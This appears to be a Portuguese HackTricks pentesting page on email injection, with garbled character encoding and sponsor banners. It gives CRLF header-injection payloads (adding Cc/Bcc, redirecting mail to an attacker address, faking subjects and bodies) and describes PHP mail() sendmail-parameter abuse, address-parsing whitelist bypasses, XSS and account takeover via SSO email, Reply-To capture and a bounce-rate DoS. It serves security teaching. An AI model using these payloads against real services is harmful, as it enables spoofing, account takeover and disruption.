# Inje√ß√µes de Email

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Injetar em e-mail enviado

### Injetar Cc e Bcc ap√≥s argumento do remetente
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
A mensagem ser√° enviada para as contas do destinat√°rio e destinat√°rio1.

### Injetar argumento
```
From:sender@domain.com%0ATo:attacker@domain.com
```
A mensagem ser√° enviada para o destinat√°rio original e para a conta do atacante.

### Injetar argumento Subject
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
O assunto falso ser√° adicionado ao assunto original e, em alguns casos, o substituir√°. Depende do comportamento do servi√ßo de e-mail.

### Alterar o corpo da mensagem

Injete uma alimenta√ß√£o de duas linhas, depois escreva sua mensagem para alterar o corpo da mensagem.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Explora√ß√£o da fun√ß√£o mail() do PHP
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### O 5¬∫ par√¢metro ($additional_parameters)

Esta se√ß√£o ser√° baseada em **como abusar desse par√¢metro supondo que um atacante o controle**.

Esse par√¢metro ser√° adicionado √† linha de comando que o PHP usar√° para invocar o bin√°rio sendmail. No entanto, ser√° higienizado com a fun√ß√£o `escapeshellcmd($additional_parameters)`.

Um atacante pode **injetar par√¢metros extras para o sendmail** neste caso.

#### Diferen√ßas na implementa√ß√£o de /usr/sbin/sendmail

A interface **sendmail** √© **fornecida pelo software de e-mail MTA** (Sendmail, Postfix, Exim etc.) instalado no sistema. Embora a **funcionalidade b√°sica** (como par√¢metros -t -i -f) permane√ßa a **mesma** por motivos de compatibilidade, **outras fun√ß√µes e par√¢metros** variam muito dependendo do MTA instalado.

Aqui est√£o alguns exemplos de diferentes p√°ginas de manual do comando/interface sendmail:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

Dependendo da **origem do bin√°rio sendmail**, diferentes op√ß√µes foram descobertas para abusar delas e **vazar arquivos ou at√© executar comandos arbitr√°rios**. Verifique como em [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injetar no nome do e-mail

### Partes ignoradas de um e-mail

Os s√≠mbolos: **+, -** e **{}** em raras ocasi√µes podem ser usados para marca√ß√£o e ignorados pela maioria dos servidores de e-mail

* Ex.: john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Coment√°rios entre par√™nteses ()** no in√≠cio ou no fim tamb√©m ser√£o ignorados

* Ex.: john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Bypass de lista branca

<figure><img src="../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>

### Aspas

<figure><img src="../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>

### IPs

Voc√™ tamb√©m pode usar IPs como nome de dom√≠nio entre colchetes:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Outras vulnerabilidades

![](<../.gitbook/assets/image (296).png>)

## SSO de terceiros

### XSS

Alguns servi√ßos como **github** ou **salesforce permitem** que voc√™ crie um **endere√ßo de e-mail com payloads XSS**. Se voc√™ pode **usar esses provedores para fazer login em outros servi√ßos** e esses servi√ßos **n√£o est√£o higienizando** corretamente o e-mail, voc√™ poderia causar **XSS**.

### Apropria√ß√£o de Conta

Se um **servi√ßo de SSO** permite que voc√™ **crie uma conta sem verificar o endere√ßo de e-mail fornecido** (como **salesforce**) e depois voc√™ pode usar essa conta para **fazer login em um servi√ßo diferente** que **confia** no salesforce, voc√™ poderia acessar qualquer conta.\
_Note que o salesforce indica se o e-mail fornecido foi ou n√£o verificado, mas a aplica√ß√£o deve levar em conta essa informa√ß√£o._

## Reply-To

Voc√™ pode enviar um e-mail usando _**De: company.com**_ e _**Responder Para: attacker.com**_ e se alguma **resposta autom√°tica** for enviada devido ao e-mail ter sido enviado **de** um **endere√ßo interno**, o **atacante** pode ser capaz de **receber** essa **resposta**.

## Taxa de Rejei√ß√£o Definitiva

Algumas aplica√ß√µes como a AWS t√™m uma **Taxa de Rejei√ß√£o Definitiva** (na AWS √© de 10%), que quando √© excedida o servi√ßo de e-mail √© bloqueado.

Uma **rejei√ß√£o definitiva** √© um **e-mail** que n√£o p√¥de ser entregue por alguns motivos permanentes. Talvez o **endere√ßo de e-mail** seja falso, talvez o dom√≠nio do **e-mail** n√£o seja um dom√≠nio real, ou talvez o servidor do destinat√°rio do **e-mail** n√£o aceite **e-mails**), isso significa que do total de 1000 e-mails, se 100 deles fossem falsos ou inv√°lidos e causassem rejei√ß√£o, o **AWS SES** bloquear√° seu servi√ßo.

Ent√£o, se voc√™ √© capaz de **enviar e-mails (talvez convites) da aplica√ß√£o web para qualquer endere√ßo de e-mail, voc√™ poderia provocar esse bloqueio enviando centenas de convites para usu√°rios e dom√≠nios inexistentes: DoS do servi√ßo de e-mail.**

## Refer√™ncias

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas comunit√°rias **mais avan√ßadas**.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
